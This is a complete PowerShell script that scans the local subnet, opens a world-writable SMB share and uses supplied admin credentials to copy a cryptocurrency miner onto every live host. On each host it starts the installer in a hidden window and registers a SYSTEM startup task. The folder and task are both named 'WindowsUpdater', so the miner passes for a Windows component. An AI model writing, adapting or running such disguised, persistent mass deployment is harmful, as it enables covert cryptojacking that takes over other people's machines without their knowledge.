# 🔧 CONFIGURATION
$sharedFolderName = "MinerDeploy"
$localFolderPath  = "C:\ProgramData\WindowsUpdater"
$rigListPath      = "C:\deploy\rigs.txt"
$targetFolder     = "C:\ProgramData\WindowsUpdater"

# 🛠️ STEP 0: Create Shared Folder
Write-Host "`n🛠️ Creating shared folder '$sharedFolderName'..."
try {
    if (-not (Get-SmbShare | Where-Object Name -eq $sharedFolderName)) {
        New-SmbShare -Name $sharedFolderName -Path $localFolderPath -FullAccess "Everyone"
        Write-Host "✅ Shared '$localFolderPath' as '$sharedFolderName'"
    } else {
        Write-Host "ℹ️ Share '$sharedFolderName' already exists"
    }
} catch {
    Write-Host "❌ Failed to create share — $_"
    exit
}

# 🔍 STEP 1: Discover Reachable IPs
Write-Host "`n🔍 Scanning subnet for live rigs..."
$myIp = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object PrefixOrigin -EQ 'Dhcp' | Select-Object -First 1 -ExpandProperty IPAddress)
$base = $myIp.Substring(0, $myIp.LastIndexOf('.'))

$liveIps = @()
1..254 | ForEach-Object {
    $ip = "$base.$_"
    if (Test-Connection -ComputerName $ip -Count 1 -Quiet) {
        $liveIps += $ip
        Write-Host "✅ Found: $ip"
    }
}
$liveIps | Out-File $rigListPath
Write-Host "`n💾 Saved live IPs to $rigListPath"

# 🔐 STEP 2: Get Admin Credentials
Write-Host "`n🔐 Enter admin credentials for target rigs:"
$creds = Get-Credential

# 🚀 STEP 3: Deploy Miner to Each Rig
Write-Host "`n🚀 Starting deployment..."
foreach ($ip in $liveIps) {
    Write-Host "`n📡 Deploying to $ip..."
    try {
        Invoke-Command -ComputerName $ip -Credential $creds -ScriptBlock {
            param($sourceShare, $targetFolder)

            # Create install folder
            New-Item -Path $targetFolder -ItemType Directory -Force

            # Copy full miner setup including miner_src
            Copy-Item -Path "$sourceShare\*" -Destination $targetFolder -Recurse -Force

            # Assign unique rig ID inside miner_src\config.json
            $configPath = "$targetFolder\miner_src\config.json"
            if (Test-Path $configPath) {
                (Get-Content $configPath) -replace "REPLACE_WITH_RIGID", $env:COMPUTERNAME | Set-Content $configPath
            }

            # Run installer immediately
            Start-Process -FilePath "$targetFolder\installer.bat" -WindowStyle Hidden

            # Register autostart task for installer.bat
            $action = New-ScheduledTaskAction -Execute "$targetFolder\installer.bat"
            $trigger = New-ScheduledTaskTrigger -AtStartup
            Register-ScheduledTask -TaskName "WindowsUpdater" `
                -Action $action `
                -Trigger $trigger `
                -User "SYSTEM" `
                -RunLevel Highest `
                -Force
        } -ArgumentList "\\$env:COMPUTERNAME\$sharedFolderName", $targetFolder

        Write-Host "✔ Success on $ip"
    } catch {
        Write-Host "❌ Failed on $ip — $_"
    }
}
